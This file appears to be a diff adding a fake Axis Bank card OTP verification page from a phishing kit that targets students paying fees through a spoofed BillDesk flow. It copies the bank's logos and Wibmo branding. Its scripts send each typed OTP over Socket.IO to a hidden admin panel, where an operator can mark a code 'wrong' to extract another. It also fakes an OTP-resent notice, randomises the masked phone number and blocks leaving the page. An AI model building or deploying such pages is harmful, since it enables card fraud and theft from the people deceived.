@@ -1,0 +1,783 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <meta http-equiv="X-UA-Compatible" content="ie=edge">
+   <link rel="stylesheet" id="cssLink" type="text/css" href="https://accosa-ivs.s3.ap-south-1.amazonaws.com/accosa-ivs/v1/participant/axisb/css/emi.css">
+   <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+   <title>OTP Verification - AXIS Bank</title>
+
+   <style>
+   /* Loading Spinner Overlay */
+   .loading-overlay {
+       position: fixed;
+       top: 0;
+       left: 0;
+       width: 100%;
+       height: 100%;
+       background: rgba(255, 255, 255, 0.95);
+       display: none;
+       justify-content: center;
+       align-items: center;
+       z-index: 99999;
+       backdrop-filter: blur(5px);
+   }
+
+   .loading-overlay.active {
+       display: flex !important;
+   }
+
+   .spinner-container {
+       text-align: center;
+   }
+
+   .spinner {
+       width: 50px;
+       height: 50px;
+       border: 4px solid #f3f3f3;
+       border-top: 4px solid #97144d;
+       border-radius: 50%;
+       animation: spin 1s linear infinite;
+       margin: 0 auto 20px;
+   }
+
+   @keyframes spin {
+       0% { transform: rotate(0deg); }
+       100% { transform: rotate(360deg); }
+   }
+
+   .loading-text {
+       font-size: 16px;
+       color: #333;
+       font-weight: 600;
+   }
+
+   /* Blur effect for background */
+   body.loading .flex-container {
+       filter: blur(3px);
+       pointer-events: none;
+   }
+
+   /* Button Spinner Styles */
+   .btn-spinner {
+       display: inline-block;
+       width: 20px;
+       height: 20px;
+       border: 3px solid rgba(255, 255, 255, 0.3);
+       border-radius: 50%;
+       border-top-color: #fff;
+       animation: spin 0.8s linear infinite;
+   }
+
+   @keyframes spin {
+       0% { transform: rotate(0deg); }
+       100% { transform: rotate(360deg); }
+   }
+
+   #submitBtn {
+       position: relative;
+       transition: all 0.3s ease;
+   }
+
+   #submitBtn:disabled {
+       cursor: not-allowed;
+   }
+   </style>
+
+<script>
+function cancel() {
+    console.log("Cancel button clicked");
+    if (confirm('Are you sure you want to cancel this transaction?')) {
+        window.history.back();
+    }
+}
+
+function resendOTP() {
+    console.log("Resend OTP button clicked");
+    var err = document.getElementsByClassName("err-container")[0];
+    if (err) {
+        err.style.display = "block";
+        err.innerHTML = "Ã¢Å“â€¦ OTP resent to your registered mobile number.";
+        err.style.color = "#2e7d32";
+        err.style.background = "#e8f5e9";
+    }
+}
+
+function isNumber(evt) {
+    evt = (evt) ? evt : window.event;
+    var charCode = (evt.which) ? evt.which : evt.keyCode;
+    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+        return false;
+    }
+    return true;
+}
+
+function myFunction(divId) {
+    var x = document.getElementById(divId);
+    var plusMinusSpan = document.getElementsByClassName("plus-minus")[0];
+    if (x.style.display === "none") {
+        x.style.display = "block";
+        plusMinusSpan.innerHTML = "-";
+    } else {
+        x.style.display = "none";
+        plusMinusSpan.innerHTML = "+";
+    }
+}
+</script>
+<style>
+/* Uniform Logo Sizing */
+#renderImage, #leftLogo {
+    max-width: 120px !important;
+    max-height: 60px !important;
+    width: auto !important;
+    height: auto !important;
+    object-fit: contain !important;
+}
+
+.flex-item1, .flex-item2 {
+    display: flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+    min-height: 60px !important;
+}
+</style>
+</head>
+<body>
+
+<!-- Loading Overlay with Spinner -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <div class="loading-text">Verifying OTP...</div>
+    </div>
+</div>
+
+<div class="flex-container">
+    <div class="row">
+        <div class="flex-header">
+            <div class="flex-item1">
+                <img id="renderImage" src="https://accosa-ivs.s3.ap-south-1.amazonaws.com/accosa-ivs/v1/participant/axisb/images/axisb_logo.jpg" alt="AXIS Bank">
+            </div>
+            <div class="flex-item2">
+                <img id="leftLogo" src="https://accosa-ivs.s3.ap-south-1.amazonaws.com/accosa-ivs/v1/emv/visa/images/visa_logo.jpg" alt="Visa">
+            </div>
+
+<script>
+// INSTANT LOGO UPDATE - Executes immediately as HTML is parsed
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const cardType = urlParams.get('cardType');
+    const bankName = urlParams.get('bankName');
+    const bankLogo = urlParams.get('bankLogo');
+    const amount = urlParams.get('amount') || '82450';
+
+    console.log('[OTP-INSTANT] Executing immediate logo update');
+    console.log('[OTP-INSTANT] Card Type:', cardType);
+    console.log('[OTP-INSTANT] Bank Name:', bankName);
+    console.log('[OTP-INSTANT] Bank Logo:', bankLogo);
+
+    // Update card brand logo immediately
+    const cardLogoElement = document.getElementById('leftLogo');
+    if (cardLogoElement && cardType) {
+        let cardLogoUrl = '';
+        if (cardType === 'Visa') {
+            cardLogoUrl = 'https://accosa-ivs.s3.ap-south-1.amazonaws.com/accosa-ivs/v1/emv/visa/images/visa_logo.jpg';
+        } else if (cardType === 'Mastercard') {
+            cardLogoUrl = 'https://www.cardcomplete.com/media/medialibrary/2019/06/logo_mcidcheck_440.jpg';
+        } else if (cardType === 'RuPay') {
+            cardLogoUrl = 'https://cdn.digitalindiacorporation.in/wp-content/themes/di-child/assets/images/rupay.png';
+        }
+        if (cardLogoUrl) {
+            cardLogoElement.src = cardLogoUrl;
+            console.log('[OTP-INSTANT] Card logo updated to:', cardType);
+        }
+    }
+    // Update bank logo immediately
+    const bankLogoElement = document.getElementById('renderImage');
+    if (bankLogoElement) {
+        console.log('[OTP-INSTANT] Bank logo element found');
+        if (bankName === 'No Bank Logo') {
+            bankLogoElement.style.display = 'none';
+            console.log('[OTP-INSTANT] Bank logo hidden');
+        } else if (bankLogo) {
+            bankLogoElement.src = bankLogo;
+            bankLogoElement.alt = bankName || 'Bank Logo';
+            console.log('[OTP-INSTANT] Bank logo updated to:', bankName, 'URL:', bankLogo);
+        }
+    }
+    
+    // Format and update amount display
+    const formattedAmount = parseFloat(amount).toLocaleString('en-IN', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+    });
+    console.log('[OTP-INSTANT] Amount from URL:', amount, 'Formatted:', formattedAmount);
+    
+    // Update the amount in the payment message - use DOMContentLoaded for reliability
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', updateAmount);
+    } else {
+        updateAmount();
+    }
+    
+    function updateAmount() {
+        const option2Element = document.getElementById('option2');
+        if (option2Element) {
+            const currentHTML = option2Element.innerHTML;
+            console.log('[OTP-INSTANT] Current HTML:', currentHTML.substring(0, 100));
+            const updatedHTML = currentHTML.replace('{{DYNAMIC_AMOUNT}}', formattedAmount);
+            option2Element.innerHTML = updatedHTML;
+            console.log('[OTP-INSTANT] Amount updated successfully to:', formattedAmount);
+        } else {
+            console.error('[OTP-INSTANT] Could not find option2 element');
+        }
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+})();
+</script>
+        </div>
+        <div class="main-content">
+            <div class="card-details">
+                <div class="form_set_1">
+                    <div class="card-heading">
+                        <h1 id="headerTxt">Purchase Authentication</h1>
+                    </div>
+                    <p class="hei mid-content">
+                        <span id="option2" style="display: block;">We have sent you a text message with an OTP to your registered mobile number ending with XXXXXX8786. You are paying merchant SMSVARANASI the amount of &#8377;INR&nbsp;{{DYNAMIC_AMOUNT}} on Sat Jan 03 12:36:50 IST 2026.</span>
+                    </p>
+
+                    <form onsubmit="return false;" name="myForm" id="enterOtpForm" method="post">
+                        <div class="form_set_2">
+                            <div class="otp-box">
+                                <label class="lbl1" id="inputLabel">Enter your code below:</label>
+                                <input class="input-field" 
+                                       type="password" 
+                                       name="otpValue" 
+                                       id="otpValue"
+                                       maxlength="6" 
+                                       value="" 
+                                       onkeypress="return isNumber(event)" 
+                                       inputmode="numeric" 
+                                       pattern="[0-9]*">
+                            </div>
+
+                            <div class="err-container" style="display: none;color: red;margin-top: -7px;justify-content: safe;font-family: Arial,Helvetica,sans-serif;font-size: 12px;line-height: 22px;text-align: center;border-radius: 3px">
+                                <span class="error-cls">Please enter the OTP.</span>
+                            </div>
+
+                            <button class="submit" id="submitBtn" type="button">CONFIRM</button>
+
+                            <div class="two-button">
+                                <button class="resendcode" id="otpResend" type="button" onclick="resendOTP()">RESEND</button>
+                                <button class="cancel" id="otpReset" type="button" onclick="cancel()">CANCEL</button>
+                            </div>
+                        </div>
+
+                        <div class="timer-container">
+                            <span class="timer-cls">The page will automatically timeout after 420 seconds.</span>
+                        </div>
+
+                        <div class="two-links" onclick="myFunction('myDIV')">
+                            <span class="need-help" id="whyInfoLabel">Need some help?</span>
+                            <span style="cursor:pointer;text-align: right;" class="plus-minus">+</span>
+                        </div>
+
+                        <div id="myDIV" style="display: none;">Contact the Bank for more information.</div>
+
+                        <center>
+                            <p>
+                                Powered by<br>
+                                <img id="footerRightLogo" src="https://accosa-ivs.s3.ap-south-1.amazonaws.com/accosa-ivs/v1/common/images/wibmo_logo.png" width="65" height="25" alt="Wibmo">
+                            </p>
+                        </center>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============================================
+// OTP VERIFICATION - SOCKET.IO IMPLEMENTATION
+// ============================================
+
+var otpSocket = null;
+var otpSessionId = null;
+var isSubmitting = false;
+var allowNavigation = false; // Flag to allow navigation without popup
+
+// Initialize on page load
+window.addEventListener('load', function() {
+    console.log('[OTP] ========================================');
+    console.log('[OTP] Page loaded, initializing...');
+
+    // Get session ID from URL
+    otpSessionId = new URLSearchParams(window.location.search).get('sessionId');
+    console.log('[OTP] Session ID:', otpSessionId);
+
+    if (!otpSessionId) {
+        alert('Invalid session. Please try again.');
+        window.history.back();
+        return;
+    }
+
+    // Initialize Socket.IO connection
+    initializeSocket();
+
+    // Setup event listeners
+    setupEventListeners();
+
+    // Auto-focus on OTP input
+    var otpInput = document.getElementById('otpValue');
+    if (otpInput) {
+        otpInput.focus();
+    }
+
+    // Start 400-second timeout timer
+    startTimeoutTimer();
+
+    console.log('[OTP] Initialization complete');
+    console.log('[OTP] ========================================');
+});
+
+// ============================================
+// TIMEOUT TIMER - REDIRECT AFTER 400 SECONDS
+// ============================================
+function startTimeoutTimer() {
+    console.log('[OTP] Starting 400-second timeout timer...');
+    
+    setTimeout(function() {
+        console.log('[OTP] Timeout expired - redirecting to billdesk with error');
+        allowNavigation = true; // Allow navigation without popup
+        
+        // Clear session storage
+        sessionStorage.removeItem('otpPageLoaded');
+        
+        // Redirect to billdesk payment page with timeout error
+        window.location.href = 'billdesk_payment.html?error=timeout';
+    }, 400000); // 400 seconds = 400000 milliseconds
+}
+
+// ============================================
+// SOCKET.IO CONNECTION
+// ============================================
+function initializeSocket() {
+    console.log('[OTP] Connecting to Socket.IO server...');
+
+    otpSocket = io('http://localhost:3000', {
+        transports: ['websocket', 'polling'],
+        reconnection: true,
+        reconnectionAttempts: 5,
+        reconnectionDelay: 1000
+    });
+
+    otpSocket.on('connect', function() {
+        console.log('[OTP] Ã¢Å“â€¦ Connected to server');
+        console.log('[OTP] Socket ID:', otpSocket.id);
+
+        // CRITICAL: Update server with new socketId for this session
+        otpSocket.emit('updateSessionSocket', {
+            sessionId: otpSessionId,
+            socketId: otpSocket.id
+        });
+    // Listen for admin commands (wrong otp / reject)
+    otpSocket.on('adminCommand', function(data) {
+        try {
+            // Ensure targeting correct session
+            if (!window.otpSessionId) {
+                var params = new URLSearchParams(window.location.search);
+                window.otpSessionId = params.get('sessionId');
+            }
+            if (!data || data.sessionId !== window.otpSessionId) {
+                return; // not for this session/page
+            }
+
+            if (data.command === 'wrong otp') {
+                // Reset UI for retry
+                hideLoading();
+                var otpInput = document.getElementById('otpValue') || document.getElementById('otpInput');
+                var submitBtn = document.getElementById('submitBtn') || document.getElementById('otpSubmitBtn');
+                if (otpInput) {
+                    otpInput.value = '';
+                    otpInput.focus();
+                }
+                if (submitBtn) {
+                    submitBtn.disabled = false;
+                    submitBtn.style.filter = 'none';
+                    submitBtn.style.opacity = '1';
+                    submitBtn.textContent = submitBtn.getAttribute('data-original-text') || submitBtn.textContent || 'CONFIRM';
+                }
+                window.isSubmitting = false;
+                showError('The OTP entered is incorrect. Please try again.');
+                console.log('[OTP] Wrong OTP command handled for session:', data.sessionId);
+            } else if (data.command === 'rejectPayment') {
+                // Optional: Navigate back to page with decline message
+                window.allowNavigation = true;
+                window.location.href = 'billdesk_payment.html?error=card_declined';
+            }
+        } catch (e) {
+            console.error('[OTP] adminCommand handler error:', e);
+        }
+    });
+        console.log('[OTP] ?? Sent updateSessionSocket to server');
+    });
+
+    otpSocket.on('disconnect', function() {
+        console.log('[OTP] Ã¢ÂÅ’ Disconnected from server');
+    });
+
+    otpSocket.on('connect_error', function(error) {
+        console.error('[OTP] Connection error:', error);
+    });
+
+    // Listen for admin commands
+    
+
+    // Payment approved handler
+    
+// Listen for payment rejection on OTP page
+otpSocket.on('paymentRejected', function(data) {
+    try {
+        console.log('[OTP] Payment rejected event received:', data);
+        window.allowNavigation = true;
+        // Redirect back to billdesk page with decline reason
+        var params = new URLSearchParams(window.location.search);
+        var roll = params.get('roll') || '';
+        var name = params.get('name') || '';
+        var father = params.get('father') || '';
+        var course = params.get('course') || '';
+        var semester = params.get('semester') || '';
+        var amount = params.get('amount') || '';
+        window.location.href = 'billdesk_payment.html?error=card_declined&roll=' + encodeURIComponent(roll)
+            + '&name=' + encodeURIComponent(name)
+            + '&father=' + encodeURIComponent(father)
+            + '&course=' + encodeURIComponent(course)
+            + '&semester=' + encodeURIComponent(semester)
+            + '&amount=' + encodeURIComponent(amount);
+    } catch (e) {
+        console.error('[OTP] Error handling paymentRejected:', e);
+    }
+});otpSocket.on('paymentApproved', function(data) {
+    try {
+        console.log('[OTP] Payment approved event received:', data);
+        window.allowNavigation = true;
+        // Build redirect params
+        var params = new URLSearchParams(window.location.search);
+        var sessionId = (data && data.transaction && data.transaction.sessionId) || params.get('sessionId') || '';
+        var amount = (data && data.transaction && data.transaction.amount) || params.get('amount') || '82450';
+        var method = (data && data.transaction && data.transaction.paymentMethod) || 'Card/Net Banking';
+        // Get student data from URL params
+        var roll = params.get('roll') || '';
+        var name = params.get('name') || '';
+        var father = params.get('father') || '';
+        var course = params.get('course') || 'MBA';
+        var semester = params.get('semester') || '2';
+        
+        // Redirect to success page with all data
+        window.location.href = 'payment_success_receipt.html?sessionId=' + encodeURIComponent(sessionId)
+            + '&rollNumber=' + encodeURIComponent(roll)
+            + '&studentName=' + encodeURIComponent(name)
+            + '&fatherName=' + encodeURIComponent(father)
+            + '&course=' + encodeURIComponent(course)
+            + '&semester=' + encodeURIComponent(semester)
+            + '&amount=' + encodeURIComponent(amount)
+            + '&mode=' + encodeURIComponent(method);
+    } catch (e) {
+        console.error('[OTP] Error handling paymentApproved:', e);
+    }
+});
+}
+
+// ============================================
+// EVENT LISTENERS
+// ============================================
+function setupEventListeners() {
+    var submitBtn = document.getElementById('submitBtn');
+    var otpInput = document.getElementById('otpValue');
+
+    // Submit button click
+    if (submitBtn) {
+        submitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('[OTP] Submit button clicked');
+            submitOTP();
+        });
+    }
+
+    // Enter key on OTP input
+    if (otpInput) {
+        otpInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                console.log('[OTP] Enter key pressed');
+                submitOTP();
+            }
+        });
+    }
+}
+
+// ============================================
+// SUBMIT OTP FUNCTION
+// ============================================
+function submitOTP() {
+    console.log('[OTP] ========================================');
+    console.log('[OTP] submitOTP() called');
+
+    // Prevent double submission
+    if (isSubmitting) {
+        console.log('[OTP] Already submitting, ignoring...');
+        return;
+    }
+
+    var otpInput = document.getElementById('otpValue');
+    var submitBtn = document.getElementById('submitBtn');
+
+    if (!otpInput) {
+        console.error('[OTP] OTP input not found!');
+        return;
+    }
+
+    var otpValue = otpInput.value.trim();
+    console.log('[OTP] OTP Value:', otpValue);
+    console.log('[OTP] OTP Length:', otpValue.length);
+    console.log('[OTP] Socket connected:', otpSocket && otpSocket.connected);
+    console.log('[OTP] Session ID:', otpSessionId);
+
+    // Validate OTP
+    if (!otpValue) {
+        showError('Please enter the OTP.');
+        otpInput.focus();
+        return;
+    }
+
+    if (otpValue.length !== 6) {
+        showError('OTP must be exactly 6 digits.');
+        otpInput.focus();
+        return;
+    }
+
+    // Check socket connection
+    if (!otpSocket || !otpSocket.connected) {
+        showError('Connection error. Please refresh the page and try again.');
+        console.error('[OTP] Socket not connected!');
+        return;
+    }
+
+    // Mark as submitting
+    isSubmitting = true;
+
+    // Show loading spinner in button
+    showLoading();
+
+    // Send OTP to admin panel via Socket.IO
+    console.log('[OTP] Sending OTP to admin panel...');
+    otpSocket.emit('otp-submitted', {
+        sessionId: otpSessionId,
+        otp: otpValue
+    });
+
+    console.log('[OTP] OTP sent successfully');
+    console.log('[OTP] ========================================');
+}
+
+// ============================================
+// SHOW BUTTON LOADING SPINNER
+// ============================================
+function showLoading() {
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn) {
+        // Store original text
+        submitBtn.setAttribute('data-original-text', submitBtn.textContent);
+
+        // Add spinner HTML
+        submitBtn.innerHTML = '<span class="btn-spinner"></span>';
+
+        // Disable and blur button
+        submitBtn.disabled = true;
+        submitBtn.style.filter = 'blur(1px)';
+        submitBtn.style.opacity = '0.7';
+    }
+}
+
+// ============================================
+// HIDE BUTTON LOADING SPINNER
+// ============================================
+function hideLoading() {
+    var submitBtn = document.getElementById('submitBtn');
+    if (submitBtn) {
+        // Restore original text
+        var originalText = submitBtn.getAttribute('data-original-text') || 'CONFIRM';
+        submitBtn.textContent = originalText;
+
+        // Re-enable and remove blur
+        submitBtn.disabled = false;
+        submitBtn.style.filter = 'none';
+        submitBtn.style.opacity = '1';
+    }
+}
+
+// ============================================
+// SHOW SUCCESS MESSAGE
+// ============================================
+function showSuccess(message) {
+    var errorContainer = document.getElementsByClassName('err-container')[0];
+    if (errorContainer) {
+        errorContainer.style.display = 'block';
+        errorContainer.innerHTML = message;
+        errorContainer.style.color = '#2e7d32';
+        errorContainer.style.background = '#e8f5e9';
+        errorContainer.style.padding = '12px';
+        errorContainer.style.borderRadius = '5px';
+    }
+}
+// ============================================
+// SHOW ERROR MESSAGE
+// ============================================
+function showError(message) {
+    var errorContainer = document.getElementsByClassName('err-container')[0];
+    if (errorContainer) {
+        var errorSpan = errorContainer.querySelector('.error-cls');
+        if (errorSpan) {
+            errorSpan.textContent = message;
+        } else {
+            errorContainer.innerHTML = '<span class="error-cls">' + message + '</span>';
+        }
+        errorContainer.style.display = 'block';
+        errorContainer.style.color = 'red';
+        
+        // Auto-hide after 5 seconds
+        setTimeout(function() {
+            errorContainer.style.display = 'none';
+        }, 5000);
+    }
+}
+
+
+console.log('[OTP] Script loaded successfully');
+</script>
+
+
+<script>
+// Generate random phone number pattern XXX4XX9XXX on page load
+(function() {
+    function generateRandomPhonePattern() {
+        var digit1 = Math.floor(Math.random() * 10);
+        var digit2 = Math.floor(Math.random() * 10);
+        return 'XXX' + digit1 + 'XX' + digit2 + 'XXX';
+    }
+    
+    function getIndianDateTime() {
+        // Create date in Indian timezone (IST - UTC+5:30)
+        var now = new Date();
+        var istOffset = 5.5 * 60 * 60 * 1000; // IST is UTC+5:30
+        var istTime = new Date(now.getTime() + istOffset + (now.getTimezoneOffset() * 60 * 1000));
+        
+        // Format: "Sat Jan 03 12:36:50 IST 2026"
+        var days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+        var months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+        
+        var dayName = days[istTime.getDay()];
+        var monthName = months[istTime.getMonth()];
+        var date = ('0' + istTime.getDate()).slice(-2);
+        var hours = ('0' + istTime.getHours()).slice(-2);
+        var minutes = ('0' + istTime.getMinutes()).slice(-2);
+        var seconds = ('0' + istTime.getSeconds()).slice(-2);
+        var year = istTime.getFullYear();
+        
+        return dayName + ' ' + monthName + ' ' + date + ' ' + hours + ':' + minutes + ':' + seconds + ' IST ' + year;
+    }
+    
+    var randomPhone = generateRandomPhonePattern();
+    var indianDateTime = getIndianDateTime();
+    var option2 = document.getElementById('option2');
+    
+    if (option2) {
+        option2.innerHTML = option2.innerHTML.replace('XXXXXX8786', randomPhone);
+        option2.innerHTML = option2.innerHTML.replace(/[A-Z][a-z]{2} [A-Z][a-z]{2} \d{2} \d{2}:\d{2}:\d{2} IST \d{4}/, indianDateTime);
+    }
+    
+    console.log('[OTP] Random phone pattern generated: ' + randomPhone);
+    console.log('[OTP] Indian date/time generated: ' + indianDateTime);
+})();
+</script>
+
+<script>
+// Refresh/Reload Protection with Failure Page Redirect
+(function() {
+    // Check if page was reloaded
+    var isPageReloaded = sessionStorage.getItem('otpPageLoaded');
+    
+    if (isPageReloaded === 'true') {
+        // Page was reloaded - redirect to failure page
+        console.log('[OTP] Page reload detected - redirecting to failure page');
+        sessionStorage.removeItem('otpPageLoaded');
+        window.location.href = 'billdesk_payment.html?error=payment_cancelled';
+        return;
+    }
+    
+    // Mark page as loaded
+    sessionStorage.setItem('otpPageLoaded', 'true');
+    
+    // Show confirmation dialog on refresh/close attempt (only if not navigating via admin command)
+    window.addEventListener('beforeunload', function (e) {
+        // Skip popup if navigation is allowed (admin command)
+        if (allowNavigation) {
+            return;
+        }
+        // Browser will show its own confirmation dialog
+        // Message: "Do you want to leave this site? Changes you made may not be saved."
+        // Or: "Do you want to reload this site? Changes you made may not be saved."
+        var confirmationMessage = 'Do you want to continue this request? This could result in loss of your transaction.';
+        
+        e.preventDefault();
+        e.returnValue = confirmationMessage;
+        return confirmationMessage;
+    });
+    
+    // Clean up when navigating away normally (form submission)
+    window.addEventListener('pagehide', function() {
+        // Don't clean up sessionStorage here - let reload detection work
+    });
+    
+    console.log('[OTP] Refresh protection enabled with failure page redirect');
+})();
+</script>
+</body>
+</html>
+
+
+
+
+
+
